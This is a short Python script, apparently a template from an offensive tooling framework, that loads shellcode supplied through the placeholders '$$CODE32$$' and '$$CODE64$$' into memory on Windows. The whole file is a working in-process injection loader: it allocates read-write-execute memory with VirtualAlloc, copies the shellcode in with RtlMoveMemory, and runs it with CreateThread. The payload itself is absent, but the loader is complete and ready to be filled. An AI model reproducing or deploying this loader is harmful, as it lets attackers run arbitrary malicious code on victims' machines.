import ctypes
import platform

(arch, type) = platform.architecture()

# 32-bit Python
if arch == "32bit":
	shellcode = "$$CODE32$$"

# 64-bit Python
elif arch == "64bit":
	shellcode = "$$CODE64$$" 
else:
	shellcode = ""

# sanity check our situation
if type != "WindowsPE" or len(shellcode) == 0:
	quit()

# inject our shellcode
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
